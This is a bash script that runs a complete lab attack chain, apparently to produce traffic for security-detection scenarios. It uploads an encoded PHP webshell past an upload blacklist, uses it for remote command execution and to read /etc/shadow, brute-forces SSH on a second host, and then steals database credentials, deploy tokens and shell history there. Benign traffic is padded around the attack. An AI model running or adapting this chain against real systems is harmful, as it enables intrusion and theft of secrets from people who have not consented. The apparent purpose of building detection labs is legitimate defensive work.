#!/bin/bash
# ============================================================
# Web Penetration → Lateral SSH Brute-force (Direct IP)
# (Web 挂马 → 横向 SSH 爆破 完整攻击链 — 直连 IP 版)
#
# WARNING: Lab-only attack simulation script.
#          Do NOT run against unauthorized targets.
#
# Covered scenarios: S2 (WebShell), S5 (host anomaly),
#                    S6 (SSH brute-force), S7 (credential theft)
# Targets: 91 (Web+WebShell) → 92 (SSH weak password + sensitive data)
# Usage: bash attack.sh [WEB_IP] [WEB_PORT]
# ============================================================

set +e

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../lib/lab-safety.sh"

# ---------- 配置 ----------
WEB_IP="${1:-10.66.6.91}"
WEB_PORT="${2:-80}"
WEB_URL="http://${WEB_IP}:${WEB_PORT}"
TARGET_IP="10.66.6.92"
TARGET_USER="devops"
TARGET_PASS="devops123"
WEBSHELL_NAME="s.phtml"
BRUTE_DELAY=1

lab_require_attack_target "${WEB_IP}" || exit $?
lab_require_attack_target "${TARGET_IP}" || exit $?

P="/webshell"  # 子目录前缀

PASSWORDS=(admin password 123456 root letmein password123 12345678 qwerty admin123 test devops ubuntu centos "$TARGET_PASS")

SCAN_PATHS=(/admin /wp-admin /wp-login.php /phpmyadmin /.git/config /.env /backup.sql /manager/html /actuator /api/v1/users /console /server-status /test.php /config.php /shell.php /info.php /xmlrpc.php /.htaccess /wp-config.php.bak /database.sql)

# ---------- 工具函数 ----------
SHELL_CMD()         { curl -s "${WEB_URL}${P}/uploads/${WEBSHELL_NAME}?c=$1"; }
SHELL_CMD_TIMEOUT() { curl -s --max-time "$1" "${WEB_URL}${P}/uploads/${WEBSHELL_NAME}?c=$2"; }
HTTP()              { curl -s -o /dev/null -w '%{http_code}' "$@"; }

log()  { echo -e "\033[1;34m[*]\033[0m $*"; }
ok()   { echo -e "\033[1;32m[+]\033[0m $*"; }
fail() { echo -e "\033[1;31m[-]\033[0m $*"; }
hdr()  { echo -e "\n\033[1;33m========== $* ==========\033[0m"; }

# ---------- PHASE 1: 攻击前正常业务流量 ----------
phase1_normal_traffic() {
    hdr "PHASE 1: 攻击前正常业务流量"

    local -a UAS=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
        "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
    )

    for ua in "${UAS[@]}"; do
        HTTP -H "User-Agent: $ua" "${WEB_URL}${P}/"
    done
    HTTP -H "User-Agent: ${UAS[1]}" "${WEB_URL}${P}/index.php"
    HTTP -H "User-Agent: ${UAS[0]}" "${WEB_URL}${P}/uploads/"
    HTTP -H "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)" "${WEB_URL}/robots.txt"
    HTTP "${WEB_URL}/favicon.ico"

    echo 'meeting notes content' > /tmp/_attack_notes.txt
    curl -s -o /dev/null -F "file=@/tmp/_attack_notes.txt;type=text/plain" \
         -H "User-Agent: ${UAS[0]}" "${WEB_URL}${P}/upload.php"
    HTTP -H "User-Agent: ${UAS[0]}" "${WEB_URL}${P}/uploads/_attack_notes.txt"

    ok "正常流量注入完成 (11 请求)"
}

# ---------- PHASE 2: 目录扫描 ----------
phase2_recon_scan() {
    hdr "PHASE 2: 侦察扫描"

    local count=0
    for path in "${SCAN_PATHS[@]}"; do
        HTTP -H "User-Agent: Mozilla/5.0 zgrab/0.x" "${WEB_URL}${path}"
        ((count++))
    done

    HTTP -H "User-Agent: Mozilla/5.0 Chrome/126.0" "${WEB_URL}${P}/"
    HTTP -H "User-Agent: Mozilla/5.0 (iPhone) Safari/604.1" "${WEB_URL}${P}/index.php"

    ok "扫描完成 ($count 路径)"
}

# ---------- PHASE 3: WebShell 上传 ----------
phase3_upload_webshell() {
    hdr "PHASE 3: WebShell 上传"

    log "尝试上传 .php (应被拦截)"
    echo '<?php phpinfo();?>' > /tmp/_attack_test.php
    local code
    code=$(curl -s -o /dev/null -w '%{http_code}' \
         -F "file=@/tmp/_attack_test.php;type=image/jpeg" "${WEB_URL}${P}/upload.php")
    log ".php 上传返回: $code"

    log "上传 ${WEBSHELL_NAME} (绕过黑名单)"
    echo 'PD9waHAgZWNobyAiPHByZT4iLnNoZWxsX2V4ZWMoJF9HRVRbImMiXSkuIjwvcHJlPiI7ID8+' \
        | base64 -d > "/tmp/_attack_${WEBSHELL_NAME}"
    code=$(curl -s -o /dev/null -w '%{http_code}' \
         -F "file=@/tmp/_attack_${WEBSHELL_NAME};filename=${WEBSHELL_NAME};type=image/jpeg" "${WEB_URL}${P}/upload.php")
    log ".phtml 上传返回: $code"

    log "验证 WebShell"
    local result
    result=$(SHELL_CMD "id")
    if echo "$result" | grep -q "nginx\|www-data\|apache"; then
        ok "WebShell 活跃: $result"
    else
        fail "WebShell 验证失败: $result"; exit 1
    fi
}

# ---------- PHASE 4: RCE 信息收集 ----------
phase4_rce_recon() {
    hdr "PHASE 4: RCE 信息收集"

    local -a cmds=(
        "whoami"
        "id"
        "uname+-a"
        "cat+/etc/os-release+|+head+-3"
        "hostname"
        "cat+/etc/passwd"
        "cat+/etc/shadow+2>%261"
        "/sbin/ip+addr+2>%261"
        "/sbin/ip+route+2>%261"
        "ps+aux+--sort=-%25cpu+|+head+-10"
    )

    for cmd in "${cmds[@]}"; do
        SHELL_CMD "$cmd" | head -5
    done

    ok "信息收集完成 (${#cmds[@]} 命令)"
}

# ---------- PHASE 5: 凭证搜索 + 提权 + 内网发现 ----------
phase5_privesc_discovery() {
    hdr "PHASE 5: 凭证搜索 / 提权 / 内网发现"

    log "敏感文件搜索"
    SHELL_CMD "find+/+-name+*.key+-o+-name+*.pem+2>/dev/null+|+head+-10"
    SHELL_CMD "grep+-r+password+/etc/nginx/+2>/dev/null"
    SHELL_CMD "cat+/var/www/html/webshell/upload.php"

    log "权限提升尝试"
    SHELL_CMD "sudo+-l+2>%261"
    SHELL_CMD "find+/usr/bin+-perm+-4000+-type+f+2>/dev/null"

    log "内网发现"
    SHELL_CMD "/sbin/ip+route+2>%261"
    SHELL_CMD "ping+-c2+-W1+${TARGET_IP}+2>%261"
    SHELL_CMD "/usr/bin/nmap+-Pn+-sT+-p22,80,443,3306,8080+${TARGET_IP}+2>%261"

    HTTP -H "User-Agent: Mozilla/5.0 Chrome/126.0" "${WEB_URL}${P}/"
    HTTP -H "User-Agent: Mozilla/5.0 Firefox/128.0" "${WEB_URL}${P}/uploads/"

    ok "发现 ${TARGET_IP}:22 开放"
}

# ---------- PHASE 6: SSH 暴力破解 ----------
phase6_ssh_bruteforce() {
    hdr "PHASE 6: SSH 暴力破解"

    local dict_cmd="printf+"
    for pw in "${PASSWORDS[@]}"; do
        dict_cmd+="${pw}%5Cn"
    done
    dict_cmd+="+>+/tmp/pass.txt"
    SHELL_CMD "$dict_cmd" > /dev/null

    log "开始爆破 ${TARGET_USER}@${TARGET_IP} (${#PASSWORDS[@]} 密码)"

    local ssh_opts="ssh+-o+ConnectTimeout%3D5+-o+StrictHostKeyChecking%3Dno+-o+UserKnownHostsFile%3D/dev/null"

    for pw in "${PASSWORDS[@]}"; do
        local cmd="sshpass+-p+${pw}+${ssh_opts}+${TARGET_USER}@${TARGET_IP}+echo+AUTH_SUCCESS"
        local result
        result=$(SHELL_CMD_TIMEOUT 10 "$cmd")

        if echo "$result" | grep -q "AUTH_SUCCESS"; then
            ok "密码命中: $pw"
        else
            fail "失败: $pw"
        fi
        sleep "$BRUTE_DELAY"
    done
}

# ---------- PHASE 7: 横向移动 + 数据窃取 ----------
phase7_lateral_movement() {
    hdr "PHASE 7: 横向移动 + 数据窃取"

    local ssh_prefix="sshpass+-p+${TARGET_PASS}+ssh+-o+StrictHostKeyChecking%3Dno+-o+UserKnownHostsFile%3D/dev/null+${TARGET_USER}@${TARGET_IP}"

    log "系统侦察"
    SHELL_CMD "${ssh_prefix}+id"
    SHELL_CMD "${ssh_prefix}+uname+-a"
    SHELL_CMD "${ssh_prefix}+hostname"
    SHELL_CMD "${ssh_prefix}+/sbin/ip+addr"

    log "窃取敏感文件"
    echo "--- db-credentials.conf ---"
    SHELL_CMD "${ssh_prefix}+cat+/home/${TARGET_USER}/projects/db-credentials.conf"
    echo "--- deploy-token.json ---"
    SHELL_CMD "${ssh_prefix}+cat+/home/${TARGET_USER}/.config/deploy-token.json"
    echo "--- .bash_history ---"
    SHELL_CMD "${ssh_prefix}+cat+/home/${TARGET_USER}/.bash_history"

    log "权限提升尝试"
    SHELL_CMD "${ssh_prefix}+sudo+-l+2>%261"
    SHELL_CMD "${ssh_prefix}+cat+/etc/shadow+2>%261"
    SHELL_CMD "${ssh_prefix}+find+/usr/bin+-perm+-4000+-type+f+2>/dev/null"

    ok "数据窃取完成"
}

# ---------- PHASE 8: 攻击后正常流量 ----------
phase8_post_normal() {
    hdr "PHASE 8: 攻击后正常业务流量"

    HTTP -H "User-Agent: Mozilla/5.0 Chrome/126.0" "${WEB_URL}${P}/"
    HTTP -H "User-Agent: Mozilla/5.0 Safari/605.1" "${WEB_URL}${P}/index.php"
    HTTP -H "User-Agent: Mozilla/5.0 Chrome/126.0" "${WEB_URL}${P}/uploads/"
    HTTP -H "User-Agent: Mozilla/5.0 Firefox/128.0" "${WEB_URL}${P}/"
    echo 'weekly report' > /tmp/_attack_report.txt
    curl -s -o /dev/null -F "file=@/tmp/_attack_report.txt;filename=weekly-report.txt;type=text/plain" \
         -H "User-Agent: Mozilla/5.0 Chrome/126.0" "${WEB_URL}${P}/upload.php"
    HTTP -H "User-Agent: Mozilla/5.0 (iPhone) Safari/604.1" "${WEB_URL}${P}/"
    HTTP "${WEB_URL}/favicon.ico"

    ok "正常流量注入完成"
}

# ---------- 主流程 ----------
main() {
    trap 'rm -f /tmp/_attack_* 2>/dev/null' EXIT

    echo ""
    echo "  ╔══════════════════════════════════════════╗"
    echo "  ║  Web 挂马 → 横向 SSH 爆破 攻击链         ║"
    echo "  ║  ${WEB_IP} ──▶ ${TARGET_IP}            ║"
    echo "  ╚══════════════════════════════════════════╝"
    echo ""

    hdr "连接检查"
    local code
    code=$(HTTP "${WEB_URL}${P}/")
    if [ "$code" = "200" ]; then
        ok "Web靶机 ${WEB_URL}${P}/ 可达 (HTTP $code)"
    else
        fail "Web靶机 ${WEB_URL}${P}/ 不可达 (HTTP $code)"; exit 1
    fi

    local start_time=$SECONDS

    phase1_normal_traffic
    phase2_recon_scan
    phase3_upload_webshell
    phase4_rce_recon
    phase5_privesc_discovery
    phase6_ssh_bruteforce
    phase7_lateral_movement
    phase8_post_normal

    local elapsed=$(( SECONDS - start_time ))

    echo ""
    hdr "攻击链执行完毕"
    ok "耗时: ${elapsed}s"
    ok "攻击路径: 正常流量 → 目录扫描 → WebShell(.phtml) → RCE → 内网发现 → SSH爆破 → 横向移动 → 数据窃取"
    echo ""
}

main "$@"
